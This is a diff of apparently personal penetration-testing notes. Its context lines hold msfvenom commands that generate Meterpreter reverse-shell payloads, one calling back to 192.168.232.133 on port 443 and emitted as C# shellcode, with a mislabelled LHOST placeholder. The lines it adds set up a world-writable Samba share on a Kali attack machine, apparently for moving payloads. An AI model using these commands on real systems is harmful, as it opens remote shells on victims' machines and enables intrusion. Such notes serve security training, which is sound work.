@@ -11,3 +11,14 @@ sudo msfvenom -p windows/meterpreter_reverse_https LHOST=<lport> LPORT=<lport> E
 
 For C#
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
+
+Samba install
+sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
+sudo vim /etc/samba/smb.conf
+ [visualstudio] path = /home/kali/data browseable = yes read only = no
+
+sudo smbpasswd -a kali
+sudo systemctl start smbd
+sudo systemctl start nmbd
+mkdir /home/kali/data
+chmod -R 777 /home/kali/data
